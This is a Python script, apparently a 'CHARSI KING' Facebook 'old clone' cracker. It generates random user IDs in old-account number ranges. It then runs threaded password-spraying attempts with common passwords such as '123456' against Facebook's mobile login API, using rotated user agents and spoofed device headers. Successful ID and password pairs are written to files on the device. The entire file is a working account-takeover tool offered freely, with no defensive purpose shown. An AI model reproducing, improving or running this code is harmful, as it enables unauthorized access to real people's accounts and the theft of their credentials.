# -*- coding: utf-8 -*-
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# --- COLORS FOR CHARSI THEME ---
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
R = '\033[1;31m' # Red
Y = '\033[1;33m' # Yellow
rad = '\x1b[38;5;196m'

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        pass # Silently skip or install if needed

# Suppress Warnings
from requests.exceptions import ConnectionError
requests.urllib3.disable_warnings()

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

def clear():
    os.system('clear')

# --- UPDATED USER AGENTS (2024/2025 Mix) ---
def window1():
    ua_list = [
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.193 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
    ]
    return random.choice(ua_list)

# Set window title
sys.stdout.write('\x1b]2; CHARSI KING \x07')

# --- CHARSI LOGO THEME ---
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    print(f"""{G}
      _____ _    _    _    ____  ____  ___ 
     / ____| |  | |  / \  |  _ \/ ___||_ _|
    | |    | |__| | / _ \ | |_) \___ \ | | 
    | |____|  __  |/ ___ \|  _ < ___) || | 
     \_____|_|  |_/_/   \_\_| \_\____/|___|
    {Y}========================================
    {R}[+]{W} AUTHOR  : {G}CHARSI KING
    {R}[+]{W} THEME   : {G}FULL SMOKER / NO LOGIN
    {R}[+]{W} STATUS  : {G}FREE FOR ALL
    {Y}========================================{W}
    """)

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    else: return ''

def linex():
    print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')

def BNG_71_():
    ____banner____()
    print(f'       {R}({W}A{R}){W}>{R}×{W}<{G} OLD CLONE')
    linex()
    __Jihad__ = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} CHOICE {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print(f'       {R}({W}A{R}){W}>{R}×{W}<{G} ALL SERIES')
    linex()
    print(f'       {R}({W}B{R}){W}>{R}×{W}<{G} 100003/4 SERIES')
    linex()
    print(f'       {R}({W}C{R}){W}>{R}×{W}<{G} 2009 SERIES')
    linex()
    _input = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} CHOICE {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Valid Option... ")
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} Old Code {Y}:{G} 2010-2014")
    ask = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} SELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} EXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} SELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print(f'       {R}({W}A{R}){W}>{R}×{W}<{G} METHOD 1')
    print(f'       {R}({W}B{R}){W}>{R}×{W}<{G} METHOD 2')
    linex()
    meth = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} CHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} USE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tow():
    user = []
    ____banner____()
    print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} OLD CODE {Y}:{G} 2010-2014")
    input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} PRESS ENTER {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} EXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} SELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print(f'       {R}({W}A{R}){W}>{R}×{W}<{G} METHOD A')
    print(f'       {R}({W}B{R}){W}>{R}×{W}<{G} METHOD B')
    linex()
    meth = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} CHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} USE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tree():
    user = []
    ____banner____()
    print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} OLD CODE {Y}:{G} 2009-2010")
    input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} PRESS ENTER {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} EXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} TOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print(f'       {R}({W}A{R}){W}>{R}×{W}<{G} METHOD A')
    print(f'       {R}({W}B{R}){W}>{R}×{W}<{G} METHOD B')
    linex()
    meth = input(f"       {R}({W}★{R}){W}>{R}×{W}<{G} CHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} TOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       {R}({W}★{R}){W}>{R}×{W}<{G} USE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r{W}>{R}+{W}<{R}({W}CHARSI-M1{R}){W}>{R}×{W}<{R}({G}{loop}{R}){W}>{R}×{W}<{R}({W}OK{R}){W}>{R}×{W}<{R}({G}{len(oks)}{R})")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r{W}>{R}├Ч{W}<{R}({W}CHARSI{R}) {W}= {G}{uid} {W}= {G}{pw} {W}= {G}{creationyear(uid)}")
                open('/sdcard/CHARSI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r{W}>{R}├Ч{W}<{R}({W}CHARSI{R}) {W}= {G}{uid} {W}= {G}{pw} {W}= {G}{creationyear(uid)}")
                open('/sdcard/CHARSI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    try:
        sys.stdout.write(f"\r\r{W}>{R}+{W}<{R}({W}CHARSI-M2{R}){W}>{R}×{W}<{R}({G}{loop}{R}){W}>{R}×{W}<{R}({W}OK{R}){W}>{R}×{W}<{R}({G}{len(oks)}{R})")
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r{W}>{R}├Ч{W}<{R}({W}CHARSI{R}) {W}= {G}{uid} {W}= {G}{pw} {W}= {G}{creationyear(uid)}")
                    open('/sdcard/CHARSI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r{W}>{R}├Ч{W}<{R}({W}CHARSI{R}) {W}= {G}{uid} {W}= {G}{pw} {W}= {G}{creationyear(uid)}")
                    open('/sdcard/CHARSI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
    except Exception as e:
        pass
    loop += 1

if __name__ == '__main__':
    # No Key Check - Direct Entry
    BNG_71_()
